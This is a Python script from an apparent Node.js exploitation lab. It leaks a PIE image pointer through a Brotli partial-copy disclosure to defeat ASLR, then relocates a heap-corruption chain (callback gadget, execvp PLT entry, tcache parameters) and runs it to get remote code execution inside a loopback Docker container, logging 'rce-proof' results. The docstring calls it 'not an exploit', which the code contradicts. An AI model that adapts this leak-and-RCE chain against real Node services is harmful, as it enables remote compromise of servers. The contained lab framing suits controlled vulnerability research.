#!/usr/bin/env python3
"""Measure whether the bundled lab discloses a usable PIE image pointer.

This is an isolated feasibility probe, not an exploit.  It sends the existing
loopback-only Brotli grooming input, captures only the server response, and
uses `/proc/1/maps` as a validation oracle after capture.  Runtime addresses
from the oracle are never fed back into the request.
"""

from __future__ import annotations

import argparse
from collections import Counter
from dataclasses import dataclass
from datetime import datetime, timezone
import hashlib
import importlib.util
import json
import os
from pathlib import Path
import re
import shutil
import socket
import struct
import subprocess
import sys
import time


ROOT = Path(__file__).parents[1]
SERVER = ROOT / "lab" / "worker-record-transform" / "server.js"
DOCKER = os.environ.get("N2S_DOCKER", shutil.which("docker") or "/snap/bin/docker")
IMAGE = os.environ.get("N2S_PIE_RUNTIME_IMAGE", "node2shell-worker-runtime:ubuntu-24.04")
CONTAINER = "node2shell-pie-leak-current"
RECORD_SIZE = 0x330
MAX_CAPTURE = 4 * 1024 * 1024
ONE_BYTE_BROTLI = bytes.fromhex("0b00805803")
CVE_CAPTURE_RECORDS = 64
SPLIT_LEAK_RECORD_OFFSET = 0x68
SPLIT_LEAK_IMAGE_OFFSET = 0x3CB2B1A


def load(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


HEAP = load("n2s_pie_leak_heap", ROOT / "poc" / "node2shell_heap.py")
NETWORK = load(
    "n2s_pie_network_support", ROOT / "tools" / "verify_aslr_network_matrix.py"
)


@dataclass(frozen=True)
class Mapping:
    start: int
    end: int
    permissions: str
    file_offset: int
    path: str

    def contains(self, value: int) -> bool:
        return self.start <= value < self.end


MAPS_LINE = re.compile(
    r"^(?P<start>[0-9a-f]+)-(?P<end>[0-9a-f]+)\s+"
    r"(?P<permissions>\S+)\s+(?P<offset>[0-9a-f]+)\s+"
    r"\S+\s+\S+(?:\s+(?P<path>.*))?$"
)


def parse_maps(text: str) -> list[Mapping]:
    mappings: list[Mapping] = []
    for line in text.splitlines():
        match = MAPS_LINE.fullmatch(line)
        if match is None:
            raise ValueError(f"unrecognized maps line: {line!r}")
        mappings.append(
            Mapping(
                start=int(match.group("start"), 16),
                end=int(match.group("end"), 16),
                permissions=match.group("permissions"),
                file_offset=int(match.group("offset"), 16),
                path=match.group("path") or "",
            )
        )
    return mappings


def node_load_bias(mappings: list[Mapping]) -> int:
    node = [item for item in mappings if item.path == "/usr/local/bin/node"]
    if not node:
        raise RuntimeError("Node image was absent from the validation maps")
    biases = {item.start - item.file_offset for item in node}
    # ELF PT_LOAD offsets and virtual addresses can differ below page granularity.
    # All mappings in this build still reduce to one page-aligned load bias.
    page_biases = {value & ~0xFFF for value in biases}
    if len(page_biases) != 1:
        raise RuntimeError(f"ambiguous Node load biases: {sorted(page_biases)}")
    return page_biases.pop()


def docker(*arguments: str, check: bool = True) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [DOCKER, *arguments],
        check=check,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )


def stop_container() -> None:
    docker("rm", "-f", CONTAINER, check=False)


def require_pie(binary: Path) -> dict[str, str]:
    header = subprocess.run(
        ["readelf", "-h", str(binary)],
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    ).stdout
    match = re.search(r"^\s*Type:\s+(\S+)", header, re.MULTILINE)
    if match is None or match.group(1) != "DYN":
        actual = match.group(1) if match else "unknown"
        raise RuntimeError(f"probe requires a PIE ET_DYN Node binary, got {actual}")
    version = subprocess.run(
        [str(binary), "--version"],
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    ).stdout.strip()
    return {
        "elf_type": "ET_DYN",
        "node_version": version,
        "node_binary_sha256": hashlib.sha256(binary.read_bytes()).hexdigest(),
    }


def start_container(
    binary: Path, record_size: int = RECORD_SIZE, *, read_maps: bool = True
) -> list[Mapping]:
    stop_container()
    completed = docker(
        "run", "--platform", "linux/amd64", "-d",
        "--name", CONTAINER,
        "--label", "org.openai.node2shell-lab=true",
        "--label", "org.openai.node2shell-pie-leak-probe=true",
        "--read-only", "--tmpfs", "/tmp:rw,noexec,nosuid,size=16m",
        "--cap-drop", "ALL", "--security-opt", "no-new-privileges",
        "--security-opt", "seccomp=unconfined", "--pids-limit", "128",
        "--memory", "512m", "--cpus", "1.0", "--network", "host",
        "-e", "UV_THREADPOOL_SIZE=1",
        "-e", f"N2S_RECORD_SIZE={record_size:#x}",
        "-v", f"{binary}:/usr/local/bin/node:ro",
        "-v", f"{SERVER}:/app/worker-record-server.js:ro",
        "--entrypoint", "/usr/local/bin/node", IMAGE,
        "/app/worker-record-server.js",
    )
    if not completed.stdout.strip():
        raise RuntimeError("Docker did not return a container id")
    HEAP.wait_ready()
    aslr = docker("exec", CONTAINER, "cat", "/proc/sys/kernel/randomize_va_space").stdout.strip()
    if aslr != "2":
        raise RuntimeError(f"expected randomize_va_space=2, got {aslr!r}")
    if not read_maps:
        return []
    maps = docker("exec", CONTAINER, "cat", "/proc/1/maps").stdout
    return parse_maps(maps)


def receive_until_idle(connection: socket.socket, timeout: float) -> bytes:
    deadline = time.monotonic() + timeout
    connection.settimeout(min(0.25, timeout))
    captured = bytearray()
    while len(captured) < MAX_CAPTURE and time.monotonic() < deadline:
        try:
            block = connection.recv(min(65536, MAX_CAPTURE - len(captured)))
        except TimeoutError:
            if captured:
                break
            continue
        if not block:
            break
        captured.extend(block)
    return bytes(captured)


def receive_exactly(connection: socket.socket, size: int, timeout: float) -> bytes:
    connection.settimeout(timeout)
    captured = bytearray()
    while len(captured) < size:
        block = connection.recv(min(65536, size - len(captured)))
        if not block:
            break
        captured.extend(block)
    return bytes(captured)


def capture_cve_groom_probe(timeout: float) -> bytes:
    first = HEAP.stage_one(0x0003000000030000, 0xFFFFFF)
    second = HEAP.stage_two(-1, 127)
    with HEAP._connect(timeout) as connection:
        connection.sendall(HEAP.framed(first))
        if HEAP.receive_line(connection) != b"ACK\n":
            raise RuntimeError("probe first stage was not acknowledged")
        connection.sendall(HEAP.framed(second))
        expected = CVE_CAPTURE_RECORDS * RECORD_SIZE
        captured = receive_exactly(connection, expected, timeout)
    if len(captured) != expected:
        raise RuntimeError(
            f"CVE probe expected {expected:#x} bytes, got {len(captured):#x}"
        )
    return captured


def capture_split_stream_probe(timeout: float) -> bytes:
    """Exercise the app's partial-copy response using a benign one-byte stream."""

    with HEAP._connect(timeout) as connection:
        connection.sendall(HEAP.framed(ONE_BYTE_BROTLI[:1]))
        if HEAP.receive_line(connection) != b"ACK\n":
            raise RuntimeError("split-stream first fragment was not acknowledged")
        connection.sendall(HEAP.framed(ONE_BYTE_BROTLI[1:]))
        captured = receive_until_idle(connection, timeout)
    if len(captured) != RECORD_SIZE:
        raise RuntimeError(
            f"split-stream probe expected one record, got {len(captured):#x} bytes"
        )
    if captured[:1] != b"X":
        raise RuntimeError("split-stream probe did not decode its fixed one-byte body")
    return captured


def mapping_role(mapping: Mapping) -> str:
    if mapping.path == "/usr/local/bin/node":
        return "node-image"
    if mapping.path == "[heap]":
        return "heap"
    if mapping.path == "[stack]":
        return "stack"
    if mapping.path.startswith("/"):
        return "shared-file"
    if mapping.path:
        return mapping.path
    return "anonymous"


def analyze_capture(data: bytes, mappings: list[Mapping]) -> dict[str, object]:
    load_bias = node_load_bias(mappings)
    role_counts: Counter[str] = Counter()
    node_candidates: list[dict[str, object]] = []
    for record_index in range(len(data) // RECORD_SIZE):
        record = data[record_index * RECORD_SIZE : (record_index + 1) * RECORD_SIZE]
        for record_offset in range(0, RECORD_SIZE - 7, 8):
            value = struct.unpack_from("<Q", record, record_offset)[0]
            mapping = next((item for item in mappings if item.contains(value)), None)
            if mapping is None:
                continue
            role = mapping_role(mapping)
            role_counts[role] += 1
            if role == "node-image":
                node_candidates.append(
                    {
                        "record_index": record_index,
                        "record_offset": f"0x{record_offset:x}",
                        "image_offset": f"0x{value - load_bias:x}",
                        "permissions": mapping.permissions,
                    }
                )
    return {
        "capture_bytes": len(data),
        "record_count": len(data) // RECORD_SIZE,
        "capture_sha256": hashlib.sha256(data).hexdigest(),
        "mapped_qword_counts": dict(sorted(role_counts.items())),
        "node_image_candidates": node_candidates,
    }


def stable_candidates(trials: list[dict[str, object]]) -> list[dict[str, object]]:
    counts: Counter[tuple[int, str, str, str]] = Counter()
    for trial in trials:
        seen = {
            (
                int(candidate["record_index"]),
                str(candidate["record_offset"]),
                str(candidate["image_offset"]),
                str(candidate["permissions"]),
            )
            for candidate in trial["node_image_candidates"]
        }
        counts.update(seen)
    return [
        {
            "record_index": key[0],
            "record_offset": key[1],
            "image_offset": key[2],
            "permissions": key[3],
            "trials_observed": count,
        }
        for key, count in sorted(counts.items(), key=lambda item: (-item[1], item[0]))
        if count >= 2
    ]


def recurrent_image_offsets(trials: list[dict[str, object]]) -> list[dict[str, object]]:
    """Find known Node-relative pointers even when their response position moves."""

    counts: Counter[tuple[str, str]] = Counter()
    for trial in trials:
        seen = {
            (str(candidate["image_offset"]), str(candidate["permissions"]))
            for candidate in trial["node_image_candidates"]
        }
        counts.update(seen)
    return [
        {
            "image_offset": key[0],
            "permissions": key[1],
            "trials_observed": count,
        }
        for key, count in sorted(counts.items(), key=lambda item: (-item[1], item[0]))
        if count >= 2
    ]


def test_static_offset_chain(
    binary: Path, version: str, timeout: float
) -> dict[str, object]:
    """Confirm whether the existing non-PIE chain works with raw PIE offsets."""

    plt = NETWORK.DIRECT.ANALYZER.plt_symbols(binary)
    if "execvp" not in plt:
        raise RuntimeError("PIE binary has no execvp PLT entry")
    binary_sha256 = hashlib.sha256(binary.read_bytes()).hexdigest()
    attempts: list[dict[str, object]] = []
    try:
        for candidate in NETWORK.layout_candidates(binary_sha256):
            symbols = NETWORK.static_symbols(binary)
            base = min(symbols["pFree"], symbols["pContext"]) & ~0xF
            profile = HEAP.HeapProfile(
                version=version,
                node_binary_sha256=binary_sha256,
                bss_payload=base,
                callback_gadget=symbols["callback"],
                execvp_plt=plt["execvp"],
                callback_pointer_offset=symbols["pFree"] - base,
                context_pointer_offset=symbols["pContext"] - base,
                poison_staged_position=int(candidate["poison_staged_position"]),
                record_size=int(candidate["record_size"]),
                tcache_index=int(candidate["tcache_index"]),
                ring_from_heap=int(candidate["ring_from_heap"]),
            )
            profile.validate()
            started = time.monotonic()
            try:
                start_container(binary, profile.record_size)
                proof = HEAP.attack(profile, timeout)
                attempts.append(
                    {
                        "candidate": candidate["name"],
                        "outcome": "rce-proof",
                        "elapsed_seconds": round(time.monotonic() - started, 3),
                        "proof_command": proof["proof_command"],
                        "proof_stdout": proof["proof_stdout"],
                    }
                )
                return {
                    "result": "rce-verified",
                    "attempts": attempts,
                    "address_source": "static ET_DYN image offsets used as absolute addresses",
                }
            except Exception as error:
                logs = docker("logs", "--tail", "20", CONTAINER, check=False).stdout
                attempts.append(
                    {
                        "candidate": candidate["name"],
                        "outcome": "not-verified",
                        "error": f"{type(error).__name__}: {error}",
                        "container_log_tail": logs[-2000:],
                        "elapsed_seconds": round(time.monotonic() - started, 3),
                    }
                )
            finally:
                stop_container()
    finally:
        stop_container()
    return {
        "result": "rce-not-verified",
        "attempts": attempts,
        "address_source": "static ET_DYN image offsets used as absolute addresses",
        "interpretation": "PIE load bias is missing from the existing chain",
    }


def leak_load_bias(timeout: float, attempt_limit: int) -> dict[str, int]:
    """Recover a PIE base only from the fixed network response position."""

    for attempt in range(1, attempt_limit + 1):
        captured = capture_split_stream_probe(timeout)
        pointer = struct.unpack_from("<Q", captured, SPLIT_LEAK_RECORD_OFFSET)[0]
        if pointer < SPLIT_LEAK_IMAGE_OFFSET:
            continue
        load_bias = pointer - SPLIT_LEAK_IMAGE_OFFSET
        if load_bias & 0xFFF:
            continue
        # Canonical high user-space range used by x86-64 PIE executables.
        if not (1 << 40) <= load_bias < (1 << 47):
            continue
        return {
            "attempts": attempt,
            "load_bias": load_bias,
            "leaked_pointer": pointer,
        }
    raise RuntimeError(
        f"no recognized Node image pointer in {attempt_limit} network-only probes"
    )


def test_relocated_chain(
    binary: Path,
    version: str,
    timeout: float,
    leak_attempt_limit: int,
    container_attempt_limit: int,
) -> dict[str, object]:
    """Use the app-level disclosure to relocate the fixed-id heap chain."""

    plt = NETWORK.DIRECT.ANALYZER.plt_symbols(binary)
    if "execvp" not in plt:
        raise RuntimeError("PIE binary has no execvp PLT entry")
    symbols = NETWORK.static_symbols(binary)
    binary_sha256 = hashlib.sha256(binary.read_bytes()).hexdigest()
    static_base = min(symbols["pFree"], symbols["pContext"]) & ~0xF
    attempts: list[dict[str, object]] = []
    try:
        candidates = [
            candidate
            for candidate in NETWORK.layout_candidates(binary_sha256)
            if candidate["name"] == "v24-0x330"
        ]
        if len(candidates) != 1:
            raise RuntimeError("expected exactly one v24-0x330 candidate")
        candidate = candidates[0]
        for container_attempt in range(1, container_attempt_limit + 1):
            started = time.monotonic()
            leak: dict[str, int] | None = None
            try:
                start_container(binary, RECORD_SIZE, read_maps=False)
                leak = leak_load_bias(timeout, leak_attempt_limit)
                load_bias = leak["load_bias"]
                profile = HEAP.HeapProfile(
                    version=version,
                    node_binary_sha256=binary_sha256,
                    bss_payload=load_bias + static_base,
                    callback_gadget=load_bias + symbols["callback"],
                    execvp_plt=load_bias + plt["execvp"],
                    callback_pointer_offset=symbols["pFree"] - static_base,
                    context_pointer_offset=symbols["pContext"] - static_base,
                    poison_staged_position=int(candidate["poison_staged_position"]),
                    record_size=RECORD_SIZE,
                    tcache_index=int(candidate["tcache_index"]),
                    ring_from_heap=int(candidate["ring_from_heap"]),
                )
                profile.validate()
                proof = HEAP.attack(profile, timeout)
                attempts.append(
                    {
                        "candidate": candidate["name"],
                        "container_attempt": container_attempt,
                        "outcome": "rce-proof",
                        "leak_attempts": leak["attempts"],
                        "load_bias_page_aligned": True,
                        "elapsed_seconds": round(time.monotonic() - started, 3),
                        "proof_command": proof["proof_command"],
                        "proof_token": proof["proof_token"],
                        "proof_stdout": proof["proof_stdout"],
                    }
                )
                return {
                    "result": "rce-verified",
                    "attempts": attempts,
                    "address_source": "network-only app-level split-stream disclosure",
                    "debugger_used": False,
                    "runtime_address_read_used": False,
                    "proof_channel": "fresh loopback callback",
                }
            except Exception as error:
                logs = docker("logs", "--tail", "20", CONTAINER, check=False).stdout
                attempts.append(
                    {
                        "candidate": candidate["name"],
                        "container_attempt": container_attempt,
                        "outcome": "not-verified",
                        "leak_attempts": leak["attempts"] if leak else None,
                        "error": f"{type(error).__name__}: {error}",
                        "container_log_tail": logs[-2000:],
                        "elapsed_seconds": round(time.monotonic() - started, 3),
                    }
                )
            finally:
                stop_container()
    finally:
        stop_container()
    return {
        "result": "rce-not-verified",
        "attempts": attempts,
        "address_source": "network-only app-level split-stream disclosure",
        "debugger_used": False,
        "runtime_address_read_used": False,
    }


def test_oracle_relocated_chain(
    binary: Path, version: str, timeout: float, container_attempt_limit: int
) -> dict[str, object]:
    """Diagnostic control: relocate from maps before any network leak probes."""

    plt = NETWORK.DIRECT.ANALYZER.plt_symbols(binary)
    symbols = NETWORK.static_symbols(binary)
    binary_sha256 = hashlib.sha256(binary.read_bytes()).hexdigest()
    static_base = min(symbols["pFree"], symbols["pContext"]) & ~0xF
    candidate = next(
        item
        for item in NETWORK.layout_candidates(binary_sha256)
        if item["name"] == "v24-0x330"
    )
    attempts: list[dict[str, object]] = []
    try:
        for attempt in range(1, container_attempt_limit + 1):
            started = time.monotonic()
            try:
                mappings = start_container(binary, RECORD_SIZE, read_maps=True)
                load_bias = node_load_bias(mappings)
                profile = HEAP.HeapProfile(
                    version=version,
                    node_binary_sha256=binary_sha256,
                    bss_payload=load_bias + static_base,
                    callback_gadget=load_bias + symbols["callback"],
                    execvp_plt=load_bias + plt["execvp"],
                    callback_pointer_offset=symbols["pFree"] - static_base,
                    context_pointer_offset=symbols["pContext"] - static_base,
                    poison_staged_position=int(candidate["poison_staged_position"]),
                    record_size=RECORD_SIZE,
                    tcache_index=int(candidate["tcache_index"]),
                    ring_from_heap=int(candidate["ring_from_heap"]),
                )
                proof = HEAP.attack(profile, timeout)
                attempts.append(
                    {
                        "attempt": attempt,
                        "outcome": "rce-proof",
                        "elapsed_seconds": round(time.monotonic() - started, 3),
                        "proof_command": proof["proof_command"],
                        "proof_token": proof["proof_token"],
                        "proof_stdout": proof["proof_stdout"],
                    }
                )
                return {
                    "result": "rce-verified",
                    "attempts": attempts,
                    "runtime_address_read_used": True,
                    "interpretation": "diagnostic oracle control, not a network-only chain",
                }
            except Exception as error:
                attempts.append(
                    {
                        "attempt": attempt,
                        "outcome": "not-verified",
                        "error": f"{type(error).__name__}: {error}",
                        "elapsed_seconds": round(time.monotonic() - started, 3),
                    }
                )
            finally:
                stop_container()
    finally:
        stop_container()
    return {
        "result": "rce-not-verified",
        "attempts": attempts,
        "runtime_address_read_used": True,
        "interpretation": "address relocation alone is insufficient; the custom build needs a new heap layout",
    }


def run(
    binary: Path, trial_count: int, timeout: float, test_static_chain: bool
) -> dict[str, object]:
    if not 2 <= trial_count <= 100:
        raise ValueError("trials must be between 2 and 100")
    binary = binary.resolve()
    binary_metadata = require_pie(binary)
    trials: list[dict[str, object]] = []
    try:
        for trial_number in range(1, trial_count + 1):
            print(f"PIE-LEAK trial={trial_number}/{trial_count}", flush=True)
            mappings = start_container(binary)
            load_bias = node_load_bias(mappings)
            split_capture = capture_split_stream_probe(timeout)
            cve_capture = capture_cve_groom_probe(timeout)
            result = {
                "trial": trial_number,
                "split_stream": analyze_capture(split_capture, mappings),
                "cve_groom": analyze_capture(cve_capture, mappings),
            }
            result["node_load_bias_changed_from_previous"] = bool(
                trials and load_bias != int(trials[-1]["_load_bias"])
            )
            result["_load_bias"] = load_bias
            trials.append(result)
    finally:
        stop_container()

    stable = {
        probe: stable_candidates([trial[probe] for trial in trials])
        for probe in ("split_stream", "cve_groom")
    }
    recurrent = {
        probe: recurrent_image_offsets([trial[probe] for trial in trials])
        for probe in ("split_stream", "cve_groom")
    }
    load_biases = {int(trial.pop("_load_bias")) for trial in trials}
    usable = any(recurrent.values())
    report = {
        "result": "usable-node-image-leak-observed" if usable else "no-usable-node-image-leak-observed",
        "scope": "bundled loopback worker-record-transform lab",
        "binary": binary_metadata,
        "trial_count": trial_count,
        "distinct_node_load_bias_count": len(load_biases),
        "stable_node_image_candidates": stable,
        "recurrent_node_image_offsets": recurrent,
        "trials": trials,
        "method": {
            "network_input": "fixed loopback Brotli grooming probe",
            "probes": {
                "split_stream": "benign one-byte Brotli stream split across two frames; measures the bundled app's allocUnsafeSlow partial-copy tail",
                "cve_groom": "existing malformed Brotli grooming stream; measures output produced along the CVE path",
            },
            "runtime_address_oracle": "/proc/1/maps after capture, classification only",
            "oracle_address_fed_to_request": False,
            "debugger_used": False,
            "ld_preload_used": False,
            "aslr": "enabled (randomize_va_space=2)",
            "qword_scan": "8-byte aligned within each 0x330-byte response record",
            "usable_definition": "same known Node image-relative offset in at least two fresh containers; stable response positions are reported separately",
        },
        "limitations": [
            "A negative result is evidence for this exact app, allocator and probe, not proof that no other application-level disclosure exists.",
            "The validation oracle is not part of a network-only exploit chain.",
            "Heap or shared-library pointers do not recover the Node PIE load bias by themselves.",
        ],
        "generated_at": datetime.now(timezone.utc).isoformat(),
    }
    if test_static_chain:
        version = binary_metadata["node_version"].removeprefix("v")
        try:
            report["static_offset_chain"] = test_static_offset_chain(
                binary, version, timeout
            )
        except Exception as error:
            report["static_offset_chain"] = {
                "result": "analysis-or-execution-error",
                "error": f"{type(error).__name__}: {error}",
            }
    else:
        report["static_offset_chain"] = {"result": "not-run"}
    return report


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--node-binary", type=Path, required=True)
    parser.add_argument("--trials", type=int, default=20)
    parser.add_argument("--timeout", type=float, default=8.0)
    parser.add_argument("--output", type=Path)
    parser.add_argument(
        "--test-static-chain",
        action="store_true",
        help="also try the existing fixed-id chain with unrelocated PIE offsets",
    )
    parser.add_argument(
        "--relocated-only",
        action="store_true",
        help="skip the oracle survey and test the network-derived relocated fixed-id chain",
    )
    parser.add_argument(
        "--oracle-relocated-only",
        action="store_true",
        help="diagnostic control: relocate from maps without preceding leak probes",
    )
    parser.add_argument("--leak-attempt-limit", type=int, default=128)
    parser.add_argument("--container-attempt-limit", type=int, default=1)
    arguments = parser.parse_args()
    if not 1 <= arguments.leak_attempt_limit <= 512:
        parser.error("--leak-attempt-limit must be between 1 and 512")
    if not 1 <= arguments.container_attempt_limit <= 32:
        parser.error("--container-attempt-limit must be between 1 and 32")
    if arguments.relocated_only and arguments.oracle_relocated_only:
        parser.error("choose only one relocated-only mode")
    if arguments.oracle_relocated_only:
        binary = arguments.node_binary.resolve()
        metadata = require_pie(binary)
        result = {
            "result": "pie-oracle-relocated-diagnostic",
            "binary": metadata,
            "scope": "bundled loopback worker-record-transform lab",
            "oracle_relocated_chain": test_oracle_relocated_chain(
                binary,
                metadata["node_version"].removeprefix("v"),
                arguments.timeout,
                arguments.container_attempt_limit,
            ),
            "generated_at": datetime.now(timezone.utc).isoformat(),
        }
    elif arguments.relocated_only:
        binary = arguments.node_binary.resolve()
        metadata = require_pie(binary)
        result = {
            "result": "pie-relocated-chain-validation",
            "binary": metadata,
            "scope": "bundled loopback worker-record-transform lab",
            "relocated_chain": test_relocated_chain(
                binary,
                metadata["node_version"].removeprefix("v"),
                arguments.timeout,
                arguments.leak_attempt_limit,
                arguments.container_attempt_limit,
            ),
            "leak_primitive": {
                "kind": "bundled app allocUnsafeSlow partial-copy disclosure",
                "record_offset": f"0x{SPLIT_LEAK_RECORD_OFFSET:x}",
                "known_image_offset": f"0x{SPLIT_LEAK_IMAGE_OFFSET:x}",
                "oracle_used": False,
            },
            "generated_at": datetime.now(timezone.utc).isoformat(),
        }
    else:
        result = run(
            arguments.node_binary,
            arguments.trials,
            arguments.timeout,
            arguments.test_static_chain,
        )
    rendered = json.dumps(result, indent=2, sort_keys=True) + "\n"
    if arguments.output:
        arguments.output.parent.mkdir(parents=True, exist_ok=True)
        arguments.output.write_text(rendered, encoding="utf-8")
    print(rendered, end="")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
